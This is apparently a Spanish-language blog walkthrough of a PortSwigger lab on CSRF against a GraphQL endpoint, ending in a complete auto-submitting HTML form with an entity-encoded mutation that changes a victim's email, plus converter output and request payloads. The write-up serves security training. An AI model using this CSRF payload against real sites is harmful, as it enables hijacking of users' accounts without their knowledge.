---
title: "GraphQL API Vulnerabilities Lab 5"
date: 2025-03-20 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - GraphQL API Vulnerabilities
tags:
  - GraphQL API Vulnerabilities
  - Performing CSRF exploits over GraphQL
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Skills

- Performing CSRF exploits over GraphQL

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Las `funciones de gestión de usuarios` de este `laboratorio` usa un `endpoint GraphQL`. Este `endpoint` acepta solicitudes con un `content-type` de `x-www-form-urlencoded` y, por lo tanto, es vulnerable a `ataques de falsificación de petición en sitios cruzados (CSRF)`. Para `resolver` el `laboratorio`, debemos crear un `HTML` que utilice un `ataque CSRF` para `cambiar` el `correo electrónico` del `usuario víctima`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_1.png)

Si hacemos click sobre `My account`, nos podemos `loguear` con las credenciales `wiener:peter`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_2.png)

Vemos que podemos `cambiar` nuestra `dirección` de `correo electrónico`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_3.png)

Las `vulnerabilidades CSRF` pueden surgir cuando un `endpoint GraphQL` no valida el `tipo de contenido` de las `solicitudes` que recibe y no se implementan `tokens CSRF`

Las `solicitudes POST` que usan `application/json` como `content-type` son `seguras contra falsificación` siempre que `el tipo de contenido sea validado`. En este caso, `un atacante no podría hacer que el navegador de la víctima enviara esta solicitud`, incluso si la víctima visitara un `sitio malicioso`

Sin embargo, `métodos alternativos` como `GET`, o cualquier `solicitud` que use `x-www-form-urlencoded` como `content-type` , pueden ser `enviadas por un navegador`, lo que podría `dejar a los usuarios vulnerables` si el `endpoint` acepta estas `solicitudes`. En estos casos, los `atacantes` podrían `crear exploits` para `enviar solicitudes maliciosas` a la `API`

Si `inspeccionamos` el `formulario` de `cambio` de `email` vemos como funciona

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_4.png)

Accediendo a `/resources/js/gqlUtil.js` vemos este código fuente

```
const handleErrors = (handleErrorMessages) => (...errors) => {
    const messages = errors.map(e => (e['extensions'] && e['extensions']['message']) || e['message']);
    handleErrorMessages(...messages);
};

const sendQuery = (query, onGet, onErrors, onException) => {
    fetch(
            '/graphql/v1',
            {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(query)
            }
        )
        .then(response => response.json())
        .then(response => {
            const errors = response['errors'];
            if (errors) {
                onErrors(...errors);
            } else {
                onGet(response['data']);
            }
        })
        .catch(onException);
};
```

Accediendo a `/resources/js/blogSummaryGql.js` vemos este código fuente

```
const OPERATION_NAME = 'getBlogSummaries';

const QUERY = `
query ${OPERATION_NAME} {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}`;

const QUERY_BODY = {
    query: QUERY,
    operationName: OPERATION_NAME
};

const UNEXPECTED_ERROR = 'Unexpected error while trying to retrieve blog posts';

const displayErrorMessages = (...messages) => {
    const blogList = document.getElementById('blog-list');
    messages.forEach(message => {
        const errorDiv = document.createElement("div");
        errorDiv.setAttribute("class", "error-message");

        const error = document.createElement("p");
        error.setAttribute("class", "is-warning");
        error.textContent = message;

        errorDiv.appendChild(error);
        blogList.appendChild(errorDiv);
    });
};

const displayBlogSummaries = (path, queryParam) => (data) => {
    const parent = document.getElementById('blog-list');

    const blogPosts = data['getAllBlogPosts'];
    if (!blogPosts && blogPost !== []) {
        displayErrorMessages(UNEXPECTED_ERROR);
        return;
    }

    blogPosts.forEach(blogPost => {
        const blogPostElement = document.createElement('div');
        blogPostElement.setAttribute('class', 'blog-post');

        const id = blogPost['id']
        const blogPostPath = `${path}?${queryParam}=${id}`;

        const image = document.createElement('img');
        image.setAttribute('src', blogPost['image']);

        const aTag = document.createElement('a');
        aTag.setAttribute('href', blogPostPath);
        aTag.appendChild(image);

        blogPostElement.appendChild(aTag);

        const title = document.createElement('h2');
        title.textContent = blogPost['title'];
        blogPostElement.appendChild(title);

        const summary = document.createElement('p');
        summary.textContent = blogPost['summary'];
        blogPostElement.appendChild(summary);

        const button = document.createElement('a');
        button.setAttribute('class', 'button is-small');
        button.setAttribute('href', blogPostPath);
        button.textContent = 'View post';
        blogPostElement.appendChild(button);

        parent.appendChild(blogPostElement);
    });
};

const displayContent = (path, queryParam) => {
    sendQuery(QUERY_BODY, displayBlogSummaries(path, queryParam), handleErrors(displayErrorMessages), () => displayErrorMessages(UNEXPECTED_ERROR));
}
```

En `Burpsuite` con la extensión `Logger ++` vemos que se `tramita` esta `petición` a `GraphQL` cuando se `cambia` el `email`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_2.png)

Podemos probar a cambiar el `content-type` de `application/json` a `application/x-www-form-urlencoded` y el `formato` de la `query` de `JSON` a `urlencoded` y si el `servidor` lo `acepta`, podríamos aprovecharnos de esto para `explotar` un `CSRF`. Para hacer esto lo podemos hacer de `forma manual` o podemos usar mi herramienta `graphQLConverter` [https://github.com/Justice-Reaper/graphQLConverter.git](https://github.com/Justice-Reaper/graphQLConverter.git). Le tenemos que pasar por parámetro la `query` que tenemos en `Burpsuite`

```
# python graphQLConverter.py '{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"test@gmail.com"}}}'
URL Encoded Data:
query=mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7BchangeEmail%28input%3A+%24input%29+%7Bemail%7D%7D&operationName=changeEmail&variables=%7B%22input%22%3A+%7B%22email%22%3A+%22test%40gmail.com%22%7D%7D
```

Cambiamos el `content-type` de `application/json` a `application/x-www-form-urlencoded` e `insertamos` el nuevo `payload` en el `body`. Al `enviar` la `petición` vemos que `funciona correctamente`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_6.png)

```
query=mutation%20changeEmail($input:ChangeEmailInput!)%20{changeEmail(input:$input)%20{email}}&operationName=changeEmail&variables:{"input":{"email":"test@gmail.com"}}}
```

Nos `generamos` un `PoC` de `CSRF`, para ello pulsamos `click derecho > Engagements tools > Generate CSRF PoC`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_7.png)

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_8.png)

Nos `dirigimos` a nuestro `Exploit server` y lo `pegamos`. Se ve así el `payload` porque hay valores que están `HTML encodeados`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_9.png)

Si hacemos click en `View exploit` vemos como nos redirige a `/graphql/v1`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_10.png)

`Comprobamos` que se nos haya `cambiado` el `correo electrónico` y efectivamente ha funcionado

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-5/image_11.png)

He modificado el `payload` manualmente para que tenga un `mejor desempeño`. Lo siguiente que debemos hacer es dirigirnos al `Exploit server`, pegamos el `payload` y pulsamos sobre `Deliver exploit to victim`. Debemos tener en cuenta que, para que funcione el `exploit`, debemos usar un `correo diferente al nuestro` en el `payload` porque, de lo contrario, no funcionará. Esto se debe a que `dos usuarios no pueden tener el mismo correo electrónico`

```
<html>
  <body>
    <form action="https://0aac00b60484d00881e74d80000b00af.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x21;&#x29;&#x20;&#x7b;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x20;&#x7b;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x7d;&#x7d;">
      <input type="hidden" name="operationName" value="changeEmail">
      <input type="hidden" name="variables" value="&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x20;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;&#x20;&#x22;&#x50;&#x49;&#x54;&#x4f;&#x40;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x7d;">
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```
